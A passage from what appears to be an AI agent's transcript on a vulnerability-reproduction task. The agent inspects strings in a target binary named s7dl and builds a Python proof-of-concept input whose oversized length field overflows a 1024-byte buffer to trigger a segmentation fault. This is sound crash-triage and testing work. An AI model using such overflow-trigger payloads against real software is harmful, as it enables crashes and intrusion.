    "command": "strings -n 8 /workspace/artifacts/target/s7dl | grep -iE 'write|ct_|usage|start=|snap|s7' | head -30",
    "description": "Inspect binary strings for function hints"
  }
}
</tool_call>

Crash window confirmed: `2049 ≤ size ≤ 32768` with a small buffer triggers SIGSEGV. Let me verify a candidate payload and check the crash trace evidence, then write the final script.

<tool_call>
{
  "name": "Bash",
  "arguments": {
    "command": "cd /tmp && python3 -c \"\nimport struct, subprocess, tempfile, os\ndata = struct.pack('<ii', 0, 8192) + bytes(range(256))*4  # 1024-byte buffer\nwith tempfile.NamedTemporaryFile(delete=False, suffix='.bin') as f:\n    f.write(data); p = f.name\nr = subprocess.run(['/workspace/artifacts/target/s7dl', p], capture_output=True, timeout=30)\nprint('rc:', r.returncode)\nprint('stdout:', r.stdout)\nprint('stderr:', r.stderr[:400])\nos.unlink(p)\n\"",
    "description": "Verify chosen crash payload under temp file"
  }
}
</tool_call>

